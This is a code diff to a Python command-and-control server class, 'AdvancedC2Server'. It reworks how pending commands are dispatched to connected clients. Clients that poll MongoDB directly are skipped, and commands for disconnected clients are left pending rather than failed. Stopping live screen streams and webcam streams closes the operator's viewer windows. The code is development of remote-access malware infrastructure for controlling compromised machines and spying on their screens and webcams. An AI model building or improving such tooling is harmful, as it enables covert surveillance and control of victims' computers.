@@ -539,31 +539,38 @@ class AdvancedC2Server:
                     continue
 
                 with self.client_lock:
-                    if cid in self.clients:
-                        self.logger.info(f"Picking up command {cmd_id} ({c_type}) for {cid}")
+                    client = self.clients.get(cid)
+
+                if client is not None:
+                    # mongo_transport clients poll MongoDB directly — do NOT touch their commands
+                    # or we create an infinite pending→executing→pending loop via send_command
+                    if client.get('mongo_transport'):
+                        continue
+
+                    with self.client_lock:
                         # --- Handle Stream Stop locally (so window closes) ---
                         if (c_type == 'stream' or c_type == 'webcam_stream') and params.get('action') == 'stop':
-                             if c_type == 'stream' and self._stream_active_cid == cid:
-                                 self._cv2.destroyWindow(f"Live Stream - {cid[:12]}")
-                                 self._stream_active_cid = None
-                                 self._stream_win_init = False
-                             elif c_type == 'webcam_stream' and self._webcam_active_cid == cid:
-                                 self._cv2.destroyWindow(f"Webcam Stream - {cid[:12]}")
-                                 self._webcam_active_cid = None
-                                 self._webcam_win_init = False
-                             # Call waitKey to process the destroy event
-                             self._cv2.waitKey(1)
-                             
-                        # Update status to executing
-                        self.db.update_command_status(cmd_id, 'executing')
-                        # Wrap the original cmd_id from DB so response matches
-                        self.send_command([cid], c_type, params, cmd_id)
-                    else:
-                        # If client is not connected, we can't send it. 
-                        # We might want to mark it as failed or keep it pending.
-                        # For now, if it was aimed at a specific client that is gone, fail it.
-                        if cid:
-                            self.db.update_command_status(cmd_id, 'failed', error="Client not connected")
+                            if c_type == 'stream' and self._stream_active_cid == cid:
+                                self._cv2.destroyWindow(f"Live Stream - {cid[:12]}")
+                                self._stream_active_cid = None
+                                self._stream_win_init = False
+                            elif c_type == 'webcam_stream' and self._webcam_active_cid == cid:
+                                self._cv2.destroyWindow(f"Webcam Stream - {cid[:12]}")
+                                self._webcam_active_cid = None
+                                self._webcam_win_init = False
+                            try:
+                                self._cv2.waitKey(1)
+                            except Exception:
+                                pass
+
+                    # Update status to executing and forward to TCP client
+                    self.db.update_command_status(cmd_id, 'executing')
+                    self.send_command([cid], c_type, params, cmd_id)
+                else:
+                    # Client not connected. In MongoDB mode leave it pending (a mongo_transport
+                    # client may reconnect and pick it up). In SQLite/TCP mode, fail it.
+                    if cid and not self.db.use_mongo:
+                        self.db.update_command_status(cmd_id, 'failed', error="Client not connected")
         except Exception as e:
             # self.logger.error(f"Polling error: {e}")
             pass
